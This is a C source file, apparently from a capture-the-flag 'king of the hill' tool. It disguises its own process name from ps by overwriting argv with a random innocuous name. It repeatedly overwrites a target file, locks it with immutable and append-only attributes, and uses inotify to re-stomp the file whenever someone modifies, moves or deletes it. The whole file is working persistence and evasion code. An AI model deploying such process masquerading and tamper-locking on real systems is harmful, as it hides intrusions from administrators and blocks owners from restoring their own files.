#define _GNU_SOURCE
#include <linux/fs.h> // linux attr flags
#include <pthread.h>  // ..
#include <stdlib.h>   // rand
#include <string.h>   // strlen
#include <sys/file.h>
#include <sys/inotify.h>
#include <sys/ioctl.h>
#include <sys/param.h> // Change process name
#include <sys/prctl.h> // ..
#include <sys/unistd.h>
#include <sys/stat.h>

#include "constants.h"

extern int g_argc;
extern char** g_argv;

////////////////////////////////////////////////////////////////////////////////////////////////////
// Forward declarations
void padded_strcpy(char *dst, char *src);
void stomp_flag(char *file, char *content, size_t len);
void stomp_flag_ro(char *file, char *content, size_t len);
void stomp_flag_notify(char *file, char *content, size_t len);

////////////////////////////////////////////////////////////////////////////////////////////////////
// Implementation

void padded_strcpy(char *dst, char *src) {
    unsigned long src_len = strlen(src);
    unsigned long dst_len = strlen(dst);
    unsigned long length = MAX(src_len, dst_len) + 1;
    for (unsigned int i = 0; i < length; i++) {
        if (i < src_len) {
            dst[i] = src[i];
        } else {
            dst[i] = 0x00;
        }
    }
}

void scramble_process_name(unsigned int seed) {
    // Pick a random process name
    srand(seed);
    unsigned int upper = sizeof(process_names) / sizeof(process_names[0]);
    unsigned int r = rand() % upper;
    const char *name = process_names[r];

    // Change our process name
    // https://stackoverflow.com/questions/6082189/change-process-name-in-linux
    pthread_setname_np(pthread_self(), name);
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);

    // Change the Commandline seen in ps by directly reassigning argv
    padded_strcpy(g_argv[0], (char *)name);
    for (int i = 1; i < g_argc; i++)
        padded_strcpy(g_argv[i], "");
}

// Removes any special flags, sets the content, then locks the file.
void stomp_flag(char *file, char *content, size_t len) {
    int fd = open(file, O_RDWR | O_CREAT | O_TRUNC);
    int clean_attr = 0;
    int annoying_attr = FS_APPEND_FL | FS_IMMUTABLE_FL;
    if (fd > 0) {
        ioctl(fd, FS_IOC_SETFLAGS, &clean_attr);    // Clear attributes
        write(fd, content, len);                    // Write contents
        ioctl(fd, FS_IOC_SETFLAGS, &annoying_attr); // Lock the file
    }

    close(fd);
}

// Stomp the flag, but assume it was set to RO.
void stomp_flag_ro(char *file, char *content, size_t len) {
    // Make sure the file is writeable by its owner.
    chmod(file, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
    // Stomp the file
    stomp_flag(file, content, len);
    // Remove write permissions again.
    chmod(file, S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
}

// Very unfriendly busy-loop. Bad for the enivonment. Do not use ;)
void stomp_flag_loop_busy(char *file, char *content, size_t len) {
    while (1) {
        stomp_flag(file, content, len);
    }
}

// A flag stomper loop, built around the notifier API.
void stomp_flag_notify(char *file, char *content, size_t len) {
    int watcher = inotify_init();
    int flags = IN_ATTRIB | IN_DELETE_SELF | IN_MODIFY | IN_MOVE_SELF;
    int watch = inotify_add_watch(watcher, file, flags);
    char tmp[sizeof(struct inotify_event) + NAME_MAX + 1];

    do {
        // Stomp will cause a bunch of events, which we don't care for.
        inotify_rm_watch(watcher, watch);
        stomp_flag_ro(file, content, len);
        watch = inotify_add_watch(watcher, file, flags);
    } while (read(watcher, tmp, sizeof tmp) > 0);
}

void stomp_flag_loop(char *file, char *content) {
    size_t len = strlen(content);
    stomp_flag_notify(file, content, len);
}
